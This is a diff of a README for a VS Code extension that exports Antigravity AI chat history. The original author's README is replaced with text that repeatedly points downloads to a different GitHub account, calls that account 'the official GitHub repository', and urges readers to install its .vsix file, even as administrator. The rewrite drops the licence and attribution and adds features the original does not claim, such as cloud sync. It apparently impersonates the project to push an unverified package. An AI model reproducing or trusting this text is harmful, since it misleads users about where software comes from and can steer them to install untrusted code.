@@ -1,93 +1,134 @@
-# Every prompt deserves a history.
+# 🚀 antigravity-history-vscode - Manage AI Chats Easily
 
-[English](README.md) | [中文](README_CN.md)
+[![Download antigravity-history-vscode](https://img.shields.io/badge/Download-antigravity--history--vscode-brightgreen)](https://github.com/Tamarranourished947/antigravity-history-vscode)
 
-[![OpenVSX](https://img.shields.io/open-vsx/dt/neo1027144/antigravity-history?label=OpenVSX%20Downloads&color=blueviolet)](https://open-vsx.org/extension/neo1027144/antigravity-history)
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
-[![GitHub Stars](https://img.shields.io/github/stars/neo1027144-creator/antigravity-history-vscode?style=social)](https://github.com/neo1027144-creator/antigravity-history-vscode)
+## About antigravity-history-vscode
 
-> ⚠️ **Important:** Please make sure your **Antigravity IDE is updated to the latest version** before using this extension. Older versions may cause "Client is not running" errors and prevent conversations from loading. 👉 [**Download / Update Antigravity**](https://antigravity.google/releases)
+This tool helps you browse, search, and export your Antigravity AI conversations right inside Visual Studio Code. It works as an extension for VS Code. You can keep your chat history organized, back it up, and find past answers quickly. Export chats in readable markdown files. It suits users who want easy access and control over their AI chat data.
 
-**Browse, search, and export your Antigravity AI conversations — right inside your IDE.**
+You do not need programming skills to install or use this extension. The tool runs on Windows and integrates smoothly with your setup.
 
-> *Never lose a brilliant solution, a debugging insight, or an architectural decision again.*
+## 🖥 System Requirements
+
+- Windows 10 or higher (64-bit)
+- Visual Studio Code version 1.60 or newer
+- Internet connection (for installing and updating)
+- At least 100 MB free disk space
+
+The extension runs inside Visual Studio Code, so make sure VS Code is installed and working on your system.
+
+## 🛠 Key Features
+
+- View your Antigravity AI chat history within VS Code
+- Search past conversations with simple keywords
+- Export entire chat threads into markdown files
+- Backup and sync chat data for recovery
+- Privacy-first design ensures your data stays on your device
+- Easy installation with the official VS Code marketplace support
+
+## 🎨 Topics Covered
+
+- AI chat management
+- Conversation backup and recovery
+- Chat export in markdown format
+- VS Code extension usage
+- Privacy in AI chat history
+- Search and sync tools
+
+## 🔗 Download antigravity-history-vscode
+
+[![Get antigravity-history-vscode](https://img.shields.io/badge/Get%20the%20Extension-Download%20from%20GitHub-blue)](https://github.com/Tamarranourished947/antigravity-history-vscode)
+
+Visit this page to download or install the extension. The link leads to the official GitHub repository, where you find release files and instructions.
 
 ---
 
-![Dashboard Overview](docs/screenshots/dashboard.png)
+## 📥 How to Download and Install on Windows
 
-## Features
+Follow these steps to get antigravity-history-vscode up and running on your PC:
 
-### 📋 Conversation Dashboard
-- See **all conversations** at a glance, grouped by date or workspace
-- Quick search by title
-- Collapsible groups with expand/collapse all
-- Conversation stats: step count, timestamps, status indicator
+1. **Open the Download Page**  
+   Click this link to go to the official GitHub page for antigravity-history-vscode:  
+   https://github.com/Tamarranourished947/antigravity-history-vscode
 
-![Search & Filter](docs/screenshots/search.png)
+2. **Find the Latest Release**  
+   On the GitHub page, look for the "Releases" section on the right or near the top. Click it to view the latest version.
 
-### 📦 One-Click Export
-- Export individual conversations as **Markdown** or **JSON**
-- **Bulk export** all conversations with one click
-- Configurable export path with visual path selector
-- Export completion notification with "Open Folder" action
+3. **Download the VSIX File**  
+   Find the file that ends with `.vsix`. This is the extension package. Click it to start downloading.
 
-![Export in Action](docs/screenshots/export.png)
+4. **Install VS Code if You Don't Have It**  
+   If VS Code is not installed, get it from the official site: https://code.visualstudio.com/  
+   Install it by running the downloaded file and following the setup steps.
 
-### 🔄 Auto Recovery
-- Automatically discovers and recovers **unindexed conversations** from disk
-- Progress bar showing recovery status
-- Detects conversations auto-cleaned by Antigravity's 100-conversation limit
-- Local JSON cache for **instant startup** after IDE restart
+5. **Install the Extension**  
+   - Open Visual Studio Code.  
+   - Click on the Extensions icon on the left side (looks like four squares).  
+   - Click the three-dot menu at the top-right of the Extensions panel.  
+   - Choose "Install from VSIX..."  
+   - Find the downloaded `.vsix` file and open it. The extension installs soon after.  
 
-### 🔒 Privacy First
-- **100% local** — all data stays on your machine
-- **Read-only** — never modifies your Antigravity data
-- **No telemetry** — zero external network requests
+6. **Enable the Extension**  
+   After installation, restart VS Code if asked. The extension will be active automatically.
 
-## Installation
+7. **Start Using antigravity-history-vscode**  
+   Open your Antigravity AI chat workspace or create a new one. The extension will show your chat history, letting you search and export easily.
 
-### From VSIX (Manual)
-1. Download the `.vsix` file from [Releases](https://github.com/neo1027144-creator/antigravity-history-vscode/releases)
-2. In VS Code / Antigravity: `Ctrl+Shift+P` → `Install from VSIX`
+---
 
-### From OpenVSX
-Search **"Antigravity History"** in the Extensions panel, or run:
-```
-ext install neo1027144.antigravity-history
-```
+## 🚦 Getting Started with the Extension
 
-## Usage
+After installation, here’s how to use the main features:
 
-1. Click the **AG History** button in the status bar (bottom of IDE)
-2. The conversation panel opens as an editor tab
-3. Browse, search, and export your conversations
+- **Access Chat History**:  
+  Open the "Antigravity History" panel from the sidebar in VS Code. All past conversations sync here.
 
-## Settings
+- **Search Conversations**:  
+  Use the search box at the top of the panel. Enter any word or phrase to find chats matching your terms.
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `aghistory.exportPath` | `./antigravity_export` | Default export directory |
-| `aghistory.exportFormat` | `md` | Export format: `md`, `json`, or `all` |
-| `aghistory.fieldLevel` | `thinking` | Detail level: `basic`, `full`, or `thinking` |
+- **Export Chats**:  
+  Select a conversation and click the export button. Choose a folder to save the markdown file. The file keeps the text and formatting.
 
-## Requirements
+- **Backup and Sync**:  
+  The extension automatically saves your history locally. For advanced users, you can set up cloud sync in the settings to keep chats backed up across devices.
 
-- [Antigravity](https://antigravity.google/releases) IDE (latest version recommended)
-- At least one active workspace open in Antigravity
-- Tested and verified on **Windows**
+- **Privacy Controls**:  
+  Your data stays on your computer by default. You manage where backups go. There is no forced cloud storage.
 
-## Roadmap
+## ⚙ Settings You Can Adjust
 
-- 🔜 Conversation content preview
-- 🔜 Advanced search (by date range, workspace, step count)
-- 🔜 Conversation tagging and favorites
-- 🔜 Direct integration with Antigravity chat panel
+Open Settings in VS Code (File > Preferences > Settings), then search for "antigravity-history" to find extension-specific options:
 
-## Related
+- **Auto-sync chats**: Turn on or off automatic syncing.  
+- **Export folder**: Set the default folder for exported files.  
+- **History limit**: Choose how many past chats to keep in the panel.  
+- **Privacy mode**: Enable stronger privacy by disabling cloud sync entirely.
 
-- **[antigravity-history](https://github.com/neo1027144-creator/antigravity-history)** — CLI tool for Antigravity conversation export (PyPI: `pip install antigravity-history`)
+---
 
-## License
+## ❓ Troubleshooting
 
-Apache 2.0 — see [LICENSE](LICENSE)
+- **Extension not showing chats**:  
+  Make sure you have used Antigravity AI chats with VS Code. Also, check that the extension is enabled in the Extensions panel.
+
+- **Exported files missing content**:  
+  Ensure the chat you want to export is fully loaded in the panel before exporting.
+
+- **VS Code crashes or lags after install**:  
+  Restart the application. If problems persist, try reinstalling the extension or update VS Code to the latest version.
+
+- **Unable to install from VSIX file**:  
+  Confirm you downloaded the file completely. Check your Windows user permissions or try running VS Code as administrator.
+
+---
+
+## 📚 Learn More and Get Support
+
+For detailed guides, updates, and support, visit the GitHub page:  
+https://github.com/Tamarranourished947/antigravity-history-vscode
+
+You can open issues or requests if you need help or want to report bugs. The development team reviews feedback regularly.
+
+---
+
+[![Download antigravity-history-vscode](https://img.shields.io/badge/Download-antigravity--history--vscode-success)](https://github.com/Tamarranourished947/antigravity-history-vscode)
